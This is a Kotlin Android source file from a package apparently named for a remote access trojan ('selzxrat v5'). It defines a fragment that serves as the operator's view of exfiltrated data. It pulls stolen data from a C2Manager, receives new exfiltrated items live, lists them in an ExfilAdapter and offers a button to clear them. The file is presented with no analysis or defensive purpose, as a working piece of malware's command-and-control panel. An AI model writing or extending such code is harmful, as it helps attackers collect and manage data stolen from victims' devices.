package com.selzxrat.v5.fragments

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import androidx.fragment.app.Fragment
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.selzxrat.v5.C2Manager
import com.selzxrat.v5.R
import com.selzxrat.v5.adapters.ExfilAdapter

class ExfiltratedFragment : Fragment() {

    private lateinit var recyclerView: RecyclerView
    private lateinit var btnClear: Button
    private lateinit var adapter: ExfilAdapter

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val view = inflater.inflate(R.layout.fragment_exfiltrated, container, false)

        recyclerView = view.findViewById(R.id.recyclerExfil)
        btnClear = view.findViewById(R.id.btnClearExfil)

        adapter = ExfilAdapter()
        recyclerView.layoutManager = LinearLayoutManager(requireContext())
        recyclerView.adapter = adapter

        btnClear.setOnClickListener {
            C2Manager.clearExfiltratedData()
            adapter.clear()
        }

        C2Manager.getExfiltratedData { data ->
            requireActivity().runOnUiThread { adapter.setData(data) }
        }

        C2Manager.onExfilReceived { data ->
            requireActivity().runOnUiThread { adapter.addData(data) }
        }

        return view
    }
}